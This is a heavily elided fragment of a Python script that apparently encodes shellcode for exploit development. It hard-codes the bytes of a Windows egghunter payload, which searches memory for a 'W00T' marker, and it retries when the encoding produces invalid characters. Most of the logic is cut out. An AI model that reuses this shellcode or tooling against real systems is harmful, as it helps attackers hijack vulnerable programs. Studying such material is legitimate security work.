...
def main():
    ...
    if sys.argv[1] == '-':
        ...
        input_bytes = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    else:
    ...
    while i < 3:
        try:
            ...
            print('[!] Inter-bytes difference resulted too big rendering invalid char (%x, "%c"). Restarting...' % (
            ord(str(pr)), str(pr)))
            continue
